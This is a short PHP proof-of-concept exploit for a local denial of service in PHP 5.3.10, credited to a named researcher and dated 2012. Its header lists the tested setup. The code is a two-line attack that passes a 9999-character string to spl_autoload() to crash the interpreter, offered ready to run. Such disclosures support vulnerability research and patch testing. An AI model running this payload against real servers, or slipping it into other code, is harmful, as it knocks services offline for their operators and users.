<?php
#####################################################################
## PHP 5.3.10 spl_autoload() Local Denial of Service
## Tested on Windows 7 64bit, English, Apache, PHP 5.3.10
## Date: 02/06/2012
## Local Denial of Service
## Bug discovered by Pr0T3cT10n, <pr0t3ct10n@gmail.com>
## ISRAEL
## http://www.0x31337.net
#####################################################################

$buff = str_repeat("A",9999);
spl_autoload($buff);
?>